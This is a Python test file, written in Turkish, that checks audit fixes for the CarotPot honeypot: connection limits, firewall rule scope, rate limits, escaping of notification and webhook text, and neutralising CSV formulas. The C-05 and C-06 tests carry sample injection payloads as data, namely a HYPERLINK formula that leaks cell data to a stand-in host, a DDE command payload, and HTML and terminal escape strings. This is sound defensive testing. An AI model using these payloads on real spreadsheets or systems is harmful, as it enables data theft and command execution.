#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CarotPot denetim testleri: docs/denetim/carotpot.md bulgularinin (C-01...)
kalici karsiliklari. Her sinif bir bulguyu kapatir ve numarasini adinda tasir.

Ag testleri yalnizca 127.0.0.0/8 ve gecici yuksek portlarla, gercek soketle
calisir. root, gercek ufw ya da systemd gerekmez (ufw sahte calistiriciyla).

Calistirma:  python3 tests/test_carotpot_denetim.py
"""
import asyncio
import importlib.util
import io
import json
import logging
import os
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import time
import unittest
from contextlib import redirect_stdout
from importlib.machinery import SourceFileLoader

sys.dont_write_bytecode = True

KOK = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
INC = os.path.join(KOK, "config", "includes.chroot")
DIZIN = os.path.join(INC, "opt", "carotos", "carotpot")
ORTAK = os.path.join(INC, "opt", "carotos", "ortak")
SISTEM = os.path.join(INC, "etc", "systemd", "system")
for _y in (ORTAK, DIZIN):
    if _y not in sys.path:
        sys.path.insert(0, _y)

import carotpot as CP  # noqa: E402
import kanarya  # noqa: E402
import tuzaklar  # noqa: E402
from arayuz import veri as V  # noqa: E402
from arayuz.metinler import M  # noqa: E402


def yonet_yukle(ad):
    yukleyici = SourceFileLoader(ad, os.path.join(DIZIN, "carotpot-yonet"))
    spec = importlib.util.spec_from_loader(ad, yukleyici)
    mod = importlib.util.module_from_spec(spec)
    yukleyici.exec_module(mod)
    return mod


Y = yonet_yukle("carotpot_yonet_denetim")


def bos_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def oku(yol):
    with open(yol, "rb") as fh:
        return fh.read().replace(b"\r\n", b"\n").decode("utf-8")


def sessiz_gunluk():
    g = logging.getLogger("carotpot.denetim.test")
    g.propagate = False
    if not g.handlers:
        g.addHandler(logging.NullHandler())
    return g


class Kupu:
    """Islem ici CarotPot: sinirlar test icin kucultulebilir."""

    def __init__(self, ayar=None, **sinirlar):
        self.dizin = tempfile.mkdtemp(prefix="carotpot-denetim-")
        self.ayar = CP.ayar_dogrula(ayar or {})
        self.depo = CP.Depo(os.path.join(self.dizin, "olaylar.db"))
        self.kupu = CP.CarotPot(self.ayar, self.depo, sessiz_gunluk())
        for ad, deger in sinirlar.items():
            setattr(self.kupu, ad, deger)
        self.kupu.dinle = "127.0.0.1"

    def kapat(self):
        self.depo.db.close()
        shutil.rmtree(self.dizin, ignore_errors=True)

    def satir(self):
        return self.depo.sorgu("SELECT COUNT(*) FROM olaylar")[0][0]


async def baglan(port, kaynak="127.0.0.1"):
    return await asyncio.open_connection("127.0.0.1", port, local_addr=(kaynak, 0))


async def kapandi_mi(r, sure=1.5):
    """Sunucu baglantiyi kapattiysa True (veri gelmeden EOF ya da sifirlama)."""
    try:
        veri = await asyncio.wait_for(r.read(100), sure)
    except asyncio.TimeoutError:
        return False
    except ConnectionError:
        return True
    return veri == b""


# ---------------------------------------------------------------------------
# C-01: baglanti siniri kabulden once, toplam sure, SSH dahil
# ---------------------------------------------------------------------------

class C01BaglantiSiniri(unittest.TestCase):
    def setUp(self):
        self.k = Kupu(EN_COK_BAGLANTI=4, KAYNAK_BASINA_BAGLANTI=2, TOPLAM_SURE=1.5)
        self.addCleanup(self.k.kapat)

    async def sunucu(self, ad):
        modul = tuzaklar.MODULLER[ad]
        return await asyncio.start_server(self.k.kupu.isleyici(ad, modul.isle, "linux"
                                          if ad == "telnet" else tuzaklar.varsayilan_persona(ad)),
                                          "127.0.0.1", 0, limit=8192)

    def test_kaynak_basina_fazlasi_hemen_kapatilir(self):
        async def dene():
            s = await self.sunucu("redis")
            port = s.sockets[0].getsockname()[1]
            acik = [await baglan(port) for _ in range(2)]
            await asyncio.sleep(0.2)
            r, w = await baglan(port)                      # ayni kaynaktan ucuncu
            t0 = time.monotonic()
            self.assertTrue(await kapandi_mi(r))
            self.assertLess(time.monotonic() - t0, 1.0, "kuyrukta beklememeli")
            w.close()
            r2, w2 = await baglan(port, "127.0.0.2")       # baska kaynak yine kabul
            self.assertFalse(await kapandi_mi(r2, 0.5))
            w2.close()
            for _, wa in acik:
                wa.close()
            s.close()
            await s.wait_closed()
        asyncio.run(dene())

    def test_toplam_sinir_butun_tuzaklar_icin_ve_yer_geri_verilir(self):
        async def dene():
            redis = await self.sunucu("redis")
            telnet = await self.sunucu("telnet")
            rp = redis.sockets[0].getsockname()[1]
            tp = telnet.sockets[0].getsockname()[1]
            acik = []
            for i in range(4):                             # 4 kaynak, toplam sinir dolar
                acik.append(await baglan(rp, f"127.0.0.{10 + i}"))
            await asyncio.sleep(0.2)
            self.assertEqual(self.k.kupu.acik_baglanti, 4)
            r, w = await baglan(tp, "127.0.0.50")
            self.assertTrue(await kapandi_mi(r), "dolu iken Telnet hemen kapanmali")
            w.close()
            for _, wa in acik:
                wa.close()
            await asyncio.sleep(0.3)
            self.assertEqual(self.k.kupu.acik_baglanti, 0)
            self.assertFalse(self.k.kupu.kaynak_baglanti)
            r, w = await baglan(tp, "127.0.0.50")
            veri = await asyncio.wait_for(r.readuntil(b"login: "), 2)
            self.assertIn(b"login: ", veri)
            w.close()
            for s in (redis, telnet):
                s.close()
                await s.wait_closed()
        asyncio.run(dene())

    def test_damlatan_baglanti_toplam_sureyle_kesilir(self):
        async def dene():
            s = await self.sunucu("redis")
            port = s.sockets[0].getsockname()[1]
            r, w = await baglan(port)
            w.write(b"*16\r\n")
            t0 = time.monotonic()
            kapandi = False
            while time.monotonic() - t0 < 5:
                try:
                    w.write(b"$1\r\nx\r\n")                # her okuma zaman asimindan kisa
                    await w.drain()
                except ConnectionError:
                    kapandi = True
                    break
                try:
                    if await asyncio.wait_for(r.read(100), 0.3) == b"":
                        kapandi = True
                        break
                except asyncio.TimeoutError:
                    pass
                except ConnectionError:
                    kapandi = True
                    break
            self.assertTrue(kapandi)
            self.assertLess(time.monotonic() - t0, 3.5)
            w.close()
            s.close()
            await s.wait_closed()
        asyncio.run(dene())

    @unittest.skipUnless(CP.asyncssh, "python3-asyncssh yok")
    def test_ssh_sinira_dahil(self):
        from tuzaklar import ssh

        async def banner_mi(port, kaynak):
            r, w = await baglan(port, kaynak)
            try:
                veri = await asyncio.wait_for(r.read(100), 1.5)
            except (asyncio.TimeoutError, ConnectionError):
                veri = b""
            return veri, w

        async def dene():
            s, _ = await ssh.baslat(self.k.kupu, 0, self.k.dizin, "ubuntu")
            port = s.get_port()
            v1, w1 = await banner_mi(port, "127.0.0.1")
            v2, w2 = await banner_mi(port, "127.0.0.1")
            self.assertTrue(v1.startswith(b"SSH-") and v2.startswith(b"SSH-"))
            v3, w3 = await banner_mi(port, "127.0.0.1")   # kaynak siniri (2)
            self.assertFalse(v3.startswith(b"SSH-"))
            for w in (w1, w2, w3):
                w.close()
            await asyncio.sleep(0.3)
            self.assertEqual(self.k.kupu.acik_baglanti, 0)
            v4, w4 = await banner_mi(port, "127.0.0.1")
            self.assertTrue(v4.startswith(b"SSH-"))
            w4.close()
            s.close()
            await s.wait_closed()
        asyncio.run(dene())

    def test_birim_dosya_tanitici_siniri(self):
        self.assertIn("\nLimitNOFILE=4096\n", oku(os.path.join(SISTEM, "carotpot.service")))


class C01GercekHizmet(unittest.TestCase):
    """Gercek hizmet sureci (varsayilan sinirlar): ayni kaynaktan fazla
    baglanti beklemeden kapatilir, baska kaynak etkilenmez."""

    def test_kaynak_basina_sinir_hizmette(self):
        dizin = tempfile.mkdtemp(prefix="carotpot-denetim-hizmet-")
        self.addCleanup(shutil.rmtree, dizin, True)
        portlar = {ad: 0 for ad in CP.HIZMETLER}
        portlar.update(redis=bos_port(), telnet=bos_port())
        ayar = os.path.join(dizin, "ayar.json")
        with open(ayar, "w") as fh:
            json.dump({"portlar": portlar}, fh)
        durum = os.path.join(dizin, "durum.json")
        surec = subprocess.Popen(
            [sys.executable, "-I", os.path.join(DIZIN, "carotpot.py"), "--ayar", ayar,
             "--durum-dizini", os.path.join(dizin, "veri"), "--gunluk", "",
             "--durum-dosyasi", durum, "--dinle", "127.0.0.1", "run"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.addCleanup(lambda: (surec.terminate(), surec.wait(10)))
        for _ in range(100):
            if os.path.exists(durum):
                break
            time.sleep(0.1)
        n = CP.CarotPot.KAYNAK_BASINA_BAGLANTI
        acik = []
        for _ in range(n):
            s = socket.create_connection(("127.0.0.1", portlar["redis"]), timeout=3)
            acik.append(s)
        time.sleep(0.3)
        fazla = socket.create_connection(("127.0.0.1", portlar["redis"]), timeout=3)
        fazla.settimeout(1.5)
        t0 = time.monotonic()
        try:
            veri = fazla.recv(10)
        except ConnectionError:
            veri = b""
        self.assertEqual(veri, b"")
        self.assertLess(time.monotonic() - t0, 1.2)
        fazla.close()
        t = socket.create_connection(("127.0.0.1", portlar["telnet"]), timeout=3,
                                     source_address=("127.0.0.2", 0))
        t.settimeout(2)
        gelen = b""
        while b"login: " not in gelen:
            parca = t.recv(200)
            if not parca:
                break
            gelen += parca
        self.assertIn(b"login: ", gelen)
        t.close()
        for s in acik:
            s.close()


# ---------------------------------------------------------------------------
# C-02: ufw izinleri acilan tuzakla eslesir; kapsam; kullanicinin kurali
# ---------------------------------------------------------------------------

YEREL = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "169.254.0.0/16",
         "fe80::/10", "fc00::/7"]


class C02UfwIzinleri(unittest.TestCase):
    def setUp(self):
        self.komutlar = []
        self.yanit = {}          # komut demeti -> (kod, cikti)
        self.aktif = 0           # systemctl is-active donusu

        def sahte(komut, zaman=60):
            self.komutlar.append(list(komut))
            t = tuple(komut)
            if t in self.yanit:
                return self.yanit[t]
            if t == ("ufw", "status"):
                return 0, "Status: active\n"
            if komut[:2] == ["ufw", "allow"]:
                return 0, "Rule added\n"
            if komut[:2] == ["systemctl", "is-active"]:
                return self.aktif, ""
            if komut[:4] == ["systemctl", "show", "-p", "ActiveState"]:
                return 0, self.durum + "\n"
            return 0, ""
        self.durum = "active"    # systemctl show -p ActiveState donusu
        eski = Y.calistir
        Y.calistir = sahte
        self.addCleanup(setattr, Y, "calistir", eski)
        self.dizin = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dizin, True)
        for ad, dosya in (("AYAR", "ayarlar.json"), ("ACILAN", "acilan.json"),
                          ("ENGELLILER", "engelliler.json"), ("DURUM", "durum.json")):
            eski_deger = getattr(Y, ad)
            setattr(Y, ad, os.path.join(self.dizin, dosya))
            self.addCleanup(setattr, Y, ad, eski_deger)
        self.ayar_yaz({})
        with open(Y.DURUM, "w") as fh:     # http (8080) dinlenemedi
            json.dump({"baslangic": int(time.time()), "pid": 1,
                       "acik": {"ssh": 2222, "telnet": 2323}}, fh)

    def ayar_yaz(self, veri):
        with open(Y.AYAR, "w") as fh:
            json.dump(veri, fh)

    def cagir(self, *arg):
        cikti = io.StringIO()
        eski = Y.os.geteuid
        Y.os.geteuid = lambda: 0
        try:
            with redirect_stdout(cikti), self.assertRaises(SystemExit):
                Y.main(list(arg))
        finally:
            Y.os.geteuid = eski
        return json.loads(cikti.getvalue())

    def izinler(self):
        return [k for k in self.komutlar if k[:2] == ["ufw", "allow"]]

    def test_yalniz_dinlenen_portlar_ve_yalniz_yerel_ag(self):
        self.assertEqual(self.cagir("izin-ac")["ufw_izinleri"], [2222, 2323])
        izin = self.izinler()
        self.assertEqual(len(izin), 2 * len(YEREL))
        for port in ("2222", "2323"):
            for ag in YEREL:
                self.assertIn(["ufw", "allow", "from", ag, "to", "any", "port", port,
                               "proto", "tcp", "comment", "carotpot"], izin)
        self.assertFalse([k for k in izin if "8080" in " ".join(k)], "dinlenemeyen port acilmamali")
        self.assertFalse([k for k in izin if "from" not in k], "kaynaksiz kural olmamali")
        self.assertFalse([k for k in izin if "127.0.0.0/8" in k or "::1/128" in k])

    def test_internet_secenegi_her_adrese_acar(self):
        self.ayar_yaz({"internet_kabul": True})
        self.cagir("izin-ac")
        self.assertEqual(sorted(map(tuple, self.izinler())),
                         sorted([("ufw", "allow", "2222/tcp", "comment", "carotpot"),
                                 ("ufw", "allow", "2323/tcp", "comment", "carotpot")]))
        self.komutlar.clear()
        self.cagir("izin-kapat")
        self.assertIn(["ufw", "delete", "allow", "2222/tcp"], self.komutlar)
        self.assertIn(["ufw", "delete", "allow", "2323/tcp"], self.komutlar)

    def test_kullanicinin_onceden_ekledigi_kurala_dokunulmaz(self):
        self.ayar_yaz({"internet_kabul": True})
        self.yanit[("ufw", "allow", "2222/tcp", "comment", "carotpot")] = \
            (0, "Skipping adding existing rule\nSkipping adding existing rule (v6)\n")
        self.yanit[("ufw", "allow", "2323/tcp", "comment", "carotpot")] = (0, "Rule updated\n")
        self.cagir("izin-ac")
        with open(Y.ACILAN) as fh:
            self.assertEqual(json.load(fh), [])
        self.komutlar.clear()
        self.cagir("durdur")
        self.assertFalse([k for k in self.komutlar if k[:2] == ["ufw", "delete"]])

    def test_basarisiz_kural_kaydedilmez_silinemeyen_kayitta_kalir(self):
        self.yanit[("ufw", "allow", "from", "fe80::/10", "to", "any", "port", "2222",
                    "proto", "tcp", "comment", "carotpot")] = (1, "ERROR: IPv6 support disabled")
        self.cagir("izin-ac")
        with open(Y.ACILAN) as fh:
            kayit = json.load(fh)
        self.assertNotIn({"port": 2222, "kaynak": "fe80::/10"}, kayit)
        self.assertIn({"port": 2222, "kaynak": "10.0.0.0/8"}, kayit)
        sil = ("ufw", "delete", "allow", "from", "10.0.0.0/8", "to", "any", "port", "2222",
               "proto", "tcp")
        self.yanit[sil] = (1, "ERROR: Couldn't lock")
        self.cagir("izin-kapat")
        with open(Y.ACILAN) as fh:
            self.assertEqual(json.load(fh), [{"port": 2222, "kaynak": "10.0.0.0/8"}])

    def test_eski_bicim_kayit_silinir(self):
        with open(Y.ACILAN, "w") as fh:
            json.dump([2222, "bozuk", {"port": 80, "kaynak": None},
                       {"port": 2323, "kaynak": "0.0.0.0/0"}], fh)
        self.cagir("izin-kapat")
        silinen = [k for k in self.komutlar if k[:2] == ["ufw", "delete"]]
        self.assertEqual(silinen, [["ufw", "delete", "allow", "2222/tcp"]])

    def test_baslat_izni_kendisi_acmaz_durum_yoksa_izin_yok(self):
        os.unlink(Y.DURUM)
        self.assertEqual(Y.hizmet_acik_portlari(Y.CP.ayar_oku(Y.AYAR), sure=0.3), [])
        self.cagir("baslat")
        self.assertFalse(self.izinler())
        self.assertIn(["systemctl", "start", "carotpot.service"], self.komutlar)

    def test_eski_durum_dosyasi_kullanilmaz(self):
        with open(Y.DURUM, "w") as fh:
            json.dump({"baslangic": int(time.time()), "pid": 1, "acik": {"ssh": 2222}}, fh)
        os.environ["MAINPID"] = "999999"
        self.addCleanup(os.environ.pop, "MAINPID", None)
        self.assertEqual(Y.hizmet_acik_portlari(Y.CP.ayar_oku(Y.AYAR), sure=0.3), [])
        os.environ["MAINPID"] = "1"
        self.assertEqual(Y.hizmet_acik_portlari(Y.CP.ayar_oku(Y.AYAR), sure=0.3), [2222])

    def test_acilis_temizligi_yalniz_hizmet_kapaliysa(self):
        self.cagir("izin-ac")
        self.assertTrue(os.path.exists(Y.ENGELLILER), "acilis birimi kosulu icin")
        self.komutlar.clear()
        for durum in ("active", "activating", "deactivating"):
            self.durum = durum      # ExecStartPost izin ekliyor olabilir: dokunma
            self.cagir("izin-temizle")
            self.assertFalse([k for k in self.komutlar if k[:2] == ["ufw", "delete"]], durum)
        self.durum = "failed"
        self.cagir("izin-temizle")
        self.assertTrue([k for k in self.komutlar if k[:2] == ["ufw", "delete"]])

    def test_ayar_degisince_yalniz_yeniden_baslatilir(self):
        eski_stdin = sys.stdin
        sys.stdin = io.StringIO(json.dumps({"internet_kabul": True}))
        self.addCleanup(setattr, sys, "stdin", eski_stdin)
        self.assertEqual(self.cagir("ayar")["kod"], "__TAMAM__")
        self.assertIn(["systemctl", "restart", "carotpot.service"], self.komutlar)
        self.assertFalse(self.izinler())
        with open(Y.AYAR) as fh:
            self.assertIs(json.load(fh)["internet_kabul"], True)

    def test_birimler_izinleri_hizmet_omrune_baglar(self):
        birim = oku(os.path.join(SISTEM, "carotpot.service"))
        self.assertIn("\nExecStartPost=-+/usr/bin/python3 -I /opt/carotos/carotpot/carotpot-yonet "
                      "izin-ac\n", birim)
        self.assertIn("\nExecStopPost=-+/usr/bin/python3 -I /opt/carotos/carotpot/carotpot-yonet "
                      "izin-kapat\n", birim)
        temizle = oku(os.path.join(SISTEM, "carotpot-engel-temizle.service"))
        self.assertIn("\nExecStart=/usr/bin/python3 -I /opt/carotos/carotpot/carotpot-yonet "
                      "izin-temizle\n", temizle)

    def test_root_komutlari_path_ile_cozulmez(self):
        y = yonet_yukle("carotpot_yonet_denetim_yol")
        sahte_dizin = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, sahte_dizin, True)
        iz = os.path.join(sahte_dizin, "calisti")
        sahte = os.path.join(sahte_dizin, "carotpot-sahte-ufw")
        with open(sahte, "w") as fh:
            fh.write(f"#!/bin/sh\ntouch {iz}\n")
        os.chmod(sahte, 0o755)
        eski = os.environ.get("PATH", "")
        os.environ["PATH"] = sahte_dizin + os.pathsep + eski
        self.addCleanup(os.environ.__setitem__, "PATH", eski)
        kod, _ = y.calistir(["carotpot-sahte-ufw"])
        self.assertEqual(kod, 127)
        self.assertFalse(os.path.exists(iz))
        self.assertIsNone(y.sistem_yolu("../bin/sh"))
        self.assertIsNone(y.sistem_yolu("-ufw"))


class C02KapsamAyari(unittest.TestCase):
    def test_varsayilan_kapali_ve_dogrulama(self):
        self.assertIs(CP.VARSAYILAN["internet_kabul"], False)
        self.assertIs(CP.ayar_dogrula({})["internet_kabul"], False)
        self.assertIs(CP.ayar_dogrula({"internet_kabul": True})["internet_kabul"], True)
        for kotu in ("evet", 1, None, [], "true"):
            with self.assertRaises(ValueError, msg=repr(kotu)):
                CP.ayar_dogrula({"internet_kabul": kotu})

    def test_eski_ayar_dosyasi_calisir(self):
        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as fh:
            json.dump({"portlar": {"ssh": 2222}, "yoksay": [], "bekleme": 300,
                       "sakla_gun": 30, "dakikada_olay": 120, "webhook": ""}, fh)
        self.addCleanup(os.unlink, fh.name)
        self.assertIs(CP.ayar_oku(fh.name)["internet_kabul"], False)

    def test_kabul_kapsami(self):
        k = Kupu()
        self.addCleanup(k.kapat)
        self.assertTrue(k.kupu.kabul("192.168.1.5"))
        self.assertFalse(k.kupu.kabul("8.8.8.8"))
        self.assertFalse(k.kupu.kabul("2001:4860::8888"))
        i = Kupu({"internet_kabul": True, "yoksay": ["8.8.4.4"]})
        self.addCleanup(i.kapat)
        self.assertTrue(i.kupu.kabul("8.8.8.8"))
        self.assertTrue(i.kupu.kabul("2001:4860::8888"))
        self.assertTrue(i.kupu.kabul("192.168.1.5"))
        self.assertFalse(i.kupu.kabul("8.8.4.4"))        # yoksay listesi gecerli
        self.assertFalse(i.kupu.kabul("224.0.0.1"))
        self.assertFalse(i.kupu.kabul("bozuk"))

    def test_arayuz_metinleri_iki_dilli(self):
        for anahtar in ("kapsam", "internet_kabul", "internet_kabul_not"):
            self.assertTrue(M[anahtar]["tr"] and M[anahtar]["en"], anahtar)
        self.assertEqual(M["internet_kabul"]["en"], "Also accept connections from the internet")


# ---------------------------------------------------------------------------
# C-03: veritabani satir siniri, genel yazma hizi
# ---------------------------------------------------------------------------

def olay(i, kaynak="192.168.1.5"):
    return {"ts": time.time(), "hizmet": "telnet", "kaynak": kaynak, "tur": "baglanti",
            "ozet": "x", "ayrinti": str(i)}


class C03VeritabaniSiniri(unittest.TestCase):
    def setUp(self):
        self.dizin = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dizin, True)

    def test_satir_siniri_en_eskiyi_dusurur(self):
        d = CP.Depo(os.path.join(self.dizin, "o.db"), en_cok_satir=1000)
        self.addCleanup(d.db.close)
        d.BUDAMA_ARALIGI = 100
        for i in range(3000):
            d.ekle(olay(i))
        say, en_kucuk, en_buyuk = d.sorgu("SELECT COUNT(*), MIN(ayrinti+0), MAX(ayrinti+0) "
                                          "FROM olaylar")[0]
        self.assertLessEqual(say, 1000)
        self.assertEqual(en_buyuk, 2999)                  # en yeniler kalir
        self.assertGreater(en_kucuk, 1900)
        self.assertEqual(d.sorgu("PRAGMA auto_vacuum")[0][0], 2)

    def test_eski_veritabani_artimli_vakuma_gecer(self):
        yol = os.path.join(self.dizin, "eski.db")
        db = sqlite3.connect(yol)
        db.execute("CREATE TABLE olaylar (id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL NOT NULL,"
                   " hizmet TEXT NOT NULL, kaynak TEXT NOT NULL, kaynak_port INTEGER,"
                   " hedef_port INTEGER, tur TEXT NOT NULL, kullanici TEXT, parola TEXT,"
                   " ayrinti TEXT)")
        db.execute("INSERT INTO olaylar(ts,hizmet,kaynak,tur) VALUES(1,'ftp','10.0.0.1','tarama')")
        db.commit()
        db.close()
        d = CP.Depo(yol)
        self.addCleanup(d.db.close)
        self.assertEqual(d.sorgu("PRAGMA auto_vacuum")[0][0], 2)
        self.assertEqual(d.sorgu("SELECT COUNT(*) FROM olaylar")[0][0], 1)

    def test_genel_yazma_hizi_kaynak_cogaltarak_asilamaz(self):
        k = Kupu({"dakikada_olay": 6000}, DAKIKADA_GENEL_OLAY=50)
        self.addCleanup(k.kapat)

        async def dene():
            for i in range(300):
                await k.kupu.kaydet("telnet", f"10.0.{i // 250}.{i % 250 + 1}", 1, 2323,
                                    "baglanti", "x")
        asyncio.run(dene())
        self.assertEqual(k.satir(), 50)


# ---------------------------------------------------------------------------
# C-04: kaynak degistirerek bildirim, webhook ve bellek sinirlari cogaltilamaz
# ---------------------------------------------------------------------------

class C04KaynakCogaltma(unittest.TestCase):
    def test_ipv6_kaynaklar_64_onekiyle_sayilir(self):
        k = Kupu({"dakikada_olay": 10})
        self.addCleanup(k.kapat)

        async def dene():
            for i in range(100):
                await k.kupu.kaydet("telnet", f"fe80::{i + 1:x}", 1, 2323, "baglanti", "x")
        asyncio.run(dene())
        self.assertEqual(k.satir(), 10)
        self.assertEqual(CP.sinir_anahtari("fe80::1%eth0"), "fe80::/64")
        self.assertEqual(CP.sinir_anahtari("::ffff:192.168.1.9"), "192.168.1.9")

    def test_hiz_bellegi_genel_sinirla_bagli(self):
        k = Kupu({"dakikada_olay": 6000}, DAKIKADA_GENEL_OLAY=200)
        self.addCleanup(k.kapat)
        for i in range(6000):
            k.kupu.hiz_siniri(f"10.{i // 60000}.{(i // 250) % 250}.{i % 250 + 1}")
        self.assertLessEqual(sum(len(d) for d in k.kupu.hiz.values()), 200)
        self.assertLessEqual(len(k.kupu.hiz), 5000)

    def test_webhook_genel_siniri(self):
        gonderilen = []

        class Yanit:
            def read(self):
                return b""

        def sahte_ac(istek, timeout=5):
            gonderilen.append(json.loads(istek.data))
            return Yanit()
        eski = CP.urllib.request.urlopen
        CP.urllib.request.urlopen = sahte_ac
        self.addCleanup(setattr, CP.urllib.request, "urlopen", eski)
        w = CP.Webhook("https://ornek.invalid/kanca", 300)

        async def dene():
            for i in range(50):
                await w.olay(f"192.168.1.{i + 1}", "ozet @everyone <!channel>")
        asyncio.run(dene())
        self.assertEqual(len(gonderilen), CP.Webhook.DAKIKADA_EN_COK)
        govde = gonderilen[0]
        self.assertEqual(govde["allowed_mentions"], {"parse": []})
        self.assertNotIn("@everyone", govde["content"])
        self.assertNotIn("<", govde["text"])

    def test_bildirim_siniri_ve_ozet(self):
        s = CP.BildirimSiniri()
        t = 1000.0
        izinler = [s.izin(t + i) for i in range(10)]
        self.assertEqual(izinler.count(True), CP.BildirimSiniri.DAKIKADA_EN_COK)
        self.assertEqual(s.ozet_al(t + 20), 0)            # pencere dolu
        self.assertEqual(s.ozet_al(t + 75), 7)
        self.assertEqual(s.ozet_al(t + 76), 0)
        tr, en = CP.bildirim_ozeti(7, "tr"), CP.bildirim_ozeti(7, "en")
        self.assertIn("7", tr[1])
        self.assertIn("7 more sources touched the trap", en[1])

    def test_bildirici_bircok_kaynakta_ozetler(self):
        dizin = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, dizin, True)
        kayit = os.path.join(dizin, "bildirimler.txt")
        sahte = os.path.join(dizin, "notify-send")
        with open(sahte, "w") as fh:
            fh.write(f"#!/bin/sh\nfor a in \"$@\"; do :; done\necho \"$a\" >> {kayit}\n")
        os.chmod(sahte, 0o755)
        gunluk = os.path.join(dizin, "olaylar.log")
        open(gunluk, "w").close()
        eski_path = os.environ["PATH"]
        os.environ["PATH"] = dizin + os.pathsep + eski_path
        self.addCleanup(os.environ.__setitem__, "PATH", eski_path)
        sayac = {"n": 0}

        def calisiyor_mu():
            sayac["n"] += 1
            return sayac["n"] < 6
        eski = CP.hizmet_calisiyor_mu
        CP.hizmet_calisiyor_mu = calisiyor_mu
        self.addCleanup(setattr, CP, "hizmet_calisiyor_mu", eski)
        saat = [time.time()]
        gercek_time, gercek_sleep = CP.time.time, CP.time.sleep
        self.addCleanup(setattr, CP.time, "time", gercek_time)
        self.addCleanup(setattr, CP.time, "sleep", gercek_sleep)

        def uyku(_sn):
            if not os.path.getsize(gunluk):
                with open(gunluk, "a") as fh:
                    for i in range(40):
                        fh.write(CP.olay_satiri({"ts": saat[0], "hizmet": "ftp",
                                                 "kaynak": f"192.168.1.{i + 1}",
                                                 "tur": "tarama", "hedef_port": 2121,
                                                 "ozet": "x"}) + "\n")
            saat[0] += 31
        CP.time.sleep = uyku
        CP.time.time = lambda: saat[0]
        a = CP.ayrisici().parse_args(["--ayar", "/yok", "--gunluk", gunluk, "bildir"])
        self.assertEqual(CP.bildir(a), 0)
        with open(kayit) as fh:
            satirlar = fh.read().splitlines()
        self.assertLessEqual(len(satirlar), CP.BildirimSiniri.DAKIKADA_EN_COK + 1, satirlar)
        self.assertTrue(any("37" in s for s in satirlar), satirlar)


# ---------------------------------------------------------------------------
# C-05: saldirgan metni bildirime ve webhook'a arindirilmis girer
# ---------------------------------------------------------------------------

class C05MetinArindirma(unittest.TestCase):
    def notify_kaydi(self):
        dizin = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, dizin, True)
        kayit = os.path.join(dizin, "govde.txt")
        sahte = os.path.join(dizin, "notify-send")
        with open(sahte, "w") as fh:
            fh.write(f"#!/bin/sh\nfor a in \"$@\"; do :; done\nprintf '%s' \"$a\" > {kayit}\n")
        os.chmod(sahte, 0o755)
        eski = os.environ["PATH"]
        os.environ["PATH"] = dizin + os.pathsep + eski
        self.addCleanup(os.environ.__setitem__, "PATH", eski)
        return kayit

    def test_bildirim_govdesi_kacislanir(self):
        kayit = self.notify_kaydi()
        olay_ = {"kaynak": "192.168.1.9", "hizmet": "telnet", "tur": "giris",
                 "kullanici": "<a href='http://ornek.invalid/'>Guncelle</a>\x1b[31m&"}
        CP.bildirim_goster(*CP.bildirim_metni(olay_, "tr"))
        with open(kayit, encoding="utf-8") as fh:
            govde = fh.read()
        self.assertNotIn("<a", govde)
        self.assertIn("&lt;a href=", govde)
        self.assertIn("&amp;", govde)
        self.assertNotIn("\x1b", govde)

    def test_kanarya_surec_adi_kacislanir(self):
        kayit = self.notify_kaydi()
        CP.bildirim_goster(*kanarya.bildirim_metni(
            {"yol": "/tmp/x.docx", "tur": "acildi", "surec": "<b>kotu</b> (12)"}, "en"))
        with open(kayit, encoding="utf-8") as fh:
            govde = fh.read()
        self.assertNotIn("<b>", govde)
        self.assertIn("&lt;b&gt;kotu", govde)

    def test_webhook_metni(self):
        m = CP.webhook_arindir("ad @everyone @here <!channel> [tikla](http://x) `kod`\x07")
        for kotu in ("@everyone", "@here", "<", ">", "[", "](", "`", "\x07"):
            self.assertNotIn(kotu, m)


# ---------------------------------------------------------------------------
# C-06: CSV formul enjeksiyonu
# ---------------------------------------------------------------------------

class C06CsvFormul(unittest.TestCase):
    def test_formul_baslatan_hucreler(self):
        t = time.time()
        olaylar = [{"ts": t, "kaynak": "192.168.1.9", "hizmet": "ftp", "tur": "giris",
                    "kullanici": '=HYPERLINK("http://ornek.invalid/?"&A1;"tikla")',
                    "parola": "=*****", "ayrinti": "+cmd|' /C calc'!A0"},
                   {"ts": t, "kaynak": "192.168.1.9", "hizmet": "http", "tur": "istek",
                    "kullanici": "@SUM(1+1)", "parola": "-2+3", "ayrinti": "\t=1"},
                   {"ts": t, "kaynak": "192.168.1.9", "hizmet": "ftp", "tur": "giris",
                    "kullanici": "pi", "parola": "r***", "ayrinti": "normal"}]
        import csv
        satirlar = list(csv.reader(io.StringIO(V.rapor_csv(olaylar, t - 10, t + 10))))[1:]
        for satir in satirlar[:2]:
            for hucre in satir[5:]:
                self.assertTrue(hucre.startswith("'"), hucre)
        self.assertEqual(satirlar[2][5:], ["pi", "r***", "normal"])
        self.assertEqual(satirlar[0][1], "192.168.1.9")


if __name__ == "__main__":
    unittest.main(verbosity=2)
